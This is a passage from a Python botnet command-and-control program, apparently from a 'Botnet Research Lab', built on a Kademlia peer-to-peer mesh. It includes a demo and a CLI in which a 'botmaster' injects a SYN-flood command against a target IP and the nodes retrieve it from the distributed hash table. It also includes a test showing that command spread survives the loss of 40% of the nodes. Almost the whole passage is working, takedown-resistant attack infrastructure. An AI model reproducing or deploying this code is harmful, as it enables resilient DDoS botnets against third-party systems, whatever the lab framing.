    Kill kill_fraction of nodes, verify DHT command propagation survives.
    Core research finding: P2P mesh self-heals after partial takedown.
    """
    n_kill   = int(len(nodes) * kill_fraction)
    victims  = random.sample(nodes, n_kill)
    survivors = [n for n in nodes if n not in victims]

    print(f"\n{'='*58}")
    print(f"[RESILIENCE] Killing {n_kill}/{len(nodes)} nodes ({kill_fraction*100:.0f}%)")
    for v in victims:
        v.stop()
        print(f"[RESILIENCE] Killed: {v.node_id.to_hex()[:12]}... @ {v.host}:{v.port}")

    time.sleep(2)

    if survivors:
        cmd  = {"type": "syn_flood", "target": "192.168.100.20",
                "port": 80, "duration": 5}
        acks = survivors[0].inject_command(cmd)
        found = 0
        for s in survivors:
            val = s.iterative_find_value(KademliaNode.COMMAND_KEY)
            if val: found += 1
        print(f"\n[RESILIENCE] {found}/{len(survivors)} survivors found the command")
        print(f"[RESILIENCE] Botnet operational despite {kill_fraction*100:.0f}% node loss ✓")
    print('='*58)


# ── Entry point ───────────────────────────────────────────────

if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(
        description="Kademlia P2P Node — AUA Research Lab (C-compatible)"
    )
    parser.add_argument("--host",      default="127.0.0.1")
    parser.add_argument("--port",      type=int, default=7400)
    parser.add_argument("--bootstrap", action="append", default=[],
                        metavar="HOST:PORT",
                        help="Bootstrap seed (repeat for multiple)")
    parser.add_argument("--inject",    type=str, default=None,
                        metavar="JSON",
                        help="Inject command JSON and exit")
    parser.add_argument("--demo",      action="store_true",
                        help="Run local 5-node demo")
    args = parser.parse_args()

    if args.demo:
        print("=" * 58)
        print(" Kademlia P2P Demo — 5 local nodes")
        print(" AUA Botnet Research Lab")
        print(" (Wire-compatible with kademlia_p2p.c --demo)")
        print("=" * 58)

        BASE_PORT   = 7500
        nodes_demo  = []

        for i in range(5):
            port  = BASE_PORT + i
            peers = [("127.0.0.1", BASE_PORT)] if i > 0 else []
            node  = KademliaNode("127.0.0.1", port, bootstrap_peers=peers)
            nodes_demo.append(node)

        for n in nodes_demo:
            n.start()
            time.sleep(0.3)

        print("\n[DEMO] All nodes started. Stabilising routing tables...")
        time.sleep(3)

        # Botmaster injects via node 0
        print("\n[DEMO] Botmaster injecting command via node 0...")
        nodes_demo[0].inject_command({
            "type": "syn_flood", "target": "192.168.100.20",
            "port": 80, "duration": 5
        })
        time.sleep(2)

        # All nodes poll
        print("\n[DEMO] All nodes polling DHT for command...")
        found_count = 0
        for n in nodes_demo:
            val = n.iterative_find_value(KademliaNode.COMMAND_KEY)
            tag = "FOUND ✓" if val else "not found"
            print(f"  {n.node_id.to_hex()[:12]}... {tag}")
            if val: found_count += 1
        print(f"[DEMO] {found_count}/5 nodes found the command\n")

        demonstrate_resilience(nodes_demo, kill_fraction=0.4)

        print("\n[DEMO] Demo complete. Press Ctrl+C to exit.")
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            for n in nodes_demo:
                n.stop()

    else:
        print("=" * 58)
        print(" Kademlia P2P Node — AUA Botnet Research Lab")
        print(f" Node: {args.host}:{args.port}")
        print(" ISOLATED ENVIRONMENT ONLY")
        print("=" * 58)

        bootstrap_peers = []
        for bp in args.bootstrap:
            h, p = bp.rsplit(":", 1)
            bootstrap_peers.append((h, int(p)))

        node = KademliaNode(args.host, args.port,
                            bootstrap_peers=bootstrap_peers)

        def _sigint(sig, frame):
            print("\n[P2P] SIGINT — shutting down...")
            node.stop()
            sys.exit(0)
        signal.signal(signal.SIGINT, _sigint)

        node.start()

        if args.inject:
            time.sleep(2)
            cmd  = json.loads(args.inject)
            acks = node.inject_command(cmd)
            print(f"[P2P] Injected: {cmd.get('type')} | acks: {acks}")
            time.sleep(1)
            node.stop()
        else:
            print("\n[P2P] Running. Ctrl+C to stop.\n")
            while node._running:
                time.sleep(1)